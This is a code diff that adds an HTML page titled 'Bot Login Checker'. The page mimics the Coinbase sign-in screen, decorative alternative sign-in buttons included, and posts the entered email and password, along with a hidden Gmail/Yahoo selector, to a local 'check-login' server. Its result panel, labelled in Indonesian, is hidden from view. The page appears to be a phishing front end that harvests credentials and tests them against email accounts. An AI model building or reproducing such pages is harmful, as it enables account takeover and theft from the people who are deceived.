@@ -1,0 +1,244 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Bot Login Checker</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" referrerpolicy="no-referrer" />
+
+  <style>
+    body {
+      margin: 0;
+      background-color: rgba(10,11,13);
+      font-family: 'Arial', sans-serif;
+      color: white;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      min-height: 100vh;
+    }
+
+    .topnav {
+      width: 100%;
+      background-color: #0f0f0f;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 20px 40px;
+      box-sizing: border-box;
+    }
+
+    .logo {
+      font-size: 26px;
+      font-weight: bold;
+      color: white;
+    }
+
+    .signup-link {
+      font-size: 14px;
+      color: white;
+      text-decoration: none;
+      font-weight: bold;
+    }
+
+    .signup-link:hover {
+      text-decoration: underline;
+    }
+
+    .container {
+      background-color: rgba(10,11,13);
+      padding: 40px;
+      border-radius: 15px;
+      width: 100%;
+      max-width: 400px;
+      margin-top: 30px;
+      border: 0.2px solid rgba(174, 174, 174, 0.3);
+    }
+
+    h2 {
+      margin-top: 0;
+      font-size: 3.5vw;
+    }
+
+    label {
+      display: block;
+      margin: 16px 0 10px;
+      font-size: 14px;
+    }
+
+    input, select {
+      width: 95%;
+      height: 5vh;
+      padding: 10px;
+      border-radius: 8px;
+      border: 0.2px solid rgba(174, 174, 174, 0.3);
+      background-color: rgba(10,11,13);
+      color: white;
+      font-size: 14px;
+    }
+
+    button {
+      margin-top: 20px;
+      width: 100%;
+      padding: 12px;
+      background-color: rgb(80, 127, 229);
+      border: none;
+      border-radius: 25px;
+      color: rgba(10,11,13);
+      font-size: 16px;
+      font-weight: bold;
+      cursor: pointer;
+      height: 7vh;
+    }
+
+    button:disabled {
+      opacity: 0.5;
+      cursor: not-allowed;
+    }
+
+    button:hover:enabled {
+      background-color: rgb(49, 75, 132);
+    }
+
+    pre {
+      background-color: #2c2c2e;
+      padding: 16px;
+      border-radius: 8px;
+      margin-top: 24px;
+      font-size: 14px;
+      max-height: 150px;
+      overflow-y: auto;
+    }
+
+    .info {
+      text-align: center;
+      margin-top: 16px;
+      font-size: 13px;
+      color: #aaa;
+    }
+
+    .link {
+      color: #3b63f2;
+      text-decoration: none;
+    }
+
+    .divider {
+      position: relative;
+      text-align: center;
+      margin: 24px 0;
+      border-top: 1px solid #2c2c2e;
+    }
+
+    .divider-text {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background-color: #1c1c1e;
+      padding: 0 12px;
+      color: white;
+      font-size: 14px;
+      font-weight: 500;
+    }
+
+
+    .alt-signin {
+      display: flex;
+      flex-direction: column;
+    }
+
+    .alt-signin button {
+      background-color: rgb(58, 61, 69);
+      color: white;
+      display: flex;
+      padding: 0px 30px ;
+      justify-content: space-between;
+      align-items: center;
+    }
+    .alt-signin button:hover{
+      background-color: rgb(71, 73, 80);
+    }
+
+    .hide-component{
+      display: none;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- ✅ TOPNAV AKTIF -->
+  <!-- <div class="topnav">
+    <div class="logo">C</div>
+    <a class="signup-link" href="#">Sign up</a>
+  </div> -->
+
+  <div class="container">
+    <h2>Sign in to Coinbase</h2>
+
+    <label>Email</label>
+    <input type="text" id="email" placeholder="Your email address" oninput="validateForm()" />
+
+    <label>Password</label>
+    <input type="password" id="password" placeholder="Your password" oninput="validateForm()" />
+
+    <div class="hide-component">
+      <select id="domain">
+        <option value="gmail">Gmail</option>
+        <option value="yahoo">Yahoo</option>
+      </select>
+    </div>
+
+    <button onclick="checkLogin()" id="continueBtn" disabled>Continue</button>
+
+    <div class="divider">
+      <span class="divider-text">OR</span>
+    </div>    
+
+    <div class="alt-signin">
+      <button>Sign in with Passkey <i class="fas fa-key"></i></button>
+      <button>Sign in with Google <i class="fab fa-google"></i></button>
+      <button>Sign in with Apple <i class="fab fa-apple"></i> </button>
+      <button>Sign in with Wallet <i class="fab fa-apple"></i> </button>
+    </div>
+    
+
+    <div class="info">
+      Not your device? Use a private window. <br />
+      See our <a class="link" href="#">Privacy Policy</a> for more info.
+    </div>
+
+    <div class="hide-component">
+      <h3 style="margin-top: 30px;">Hasil:</h3>
+      <pre id="output">Menunggu...</pre>
+    </div>
+  </div>
+
+  <script>
+    function validateForm() {
+      const email = document.getElementById('email').value.trim();
+      const password = document.getElementById('password').value.trim();
+      const btn = document.getElementById('continueBtn');
+      btn.disabled = !(email && password);
+    }
+
+    async function checkLogin() {
+      const email = document.getElementById('email').value;
+      const password = document.getElementById('password').value;
+      const domain = document.getElementById('domain').value;
+
+      try {
+        const response = await fetch('http://localhost:3000/check-login', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ email, password, domain }),
+        });
+
+        const result = await response.json();
+        document.getElementById('output').textContent = JSON.stringify(result, null, 2);
+      } catch (err) {
+        document.getElementById('output').textContent = 'Gagal menghubungi server: ' + err.message;
+      }
+    }
+  </script>
+</body>
+</html>
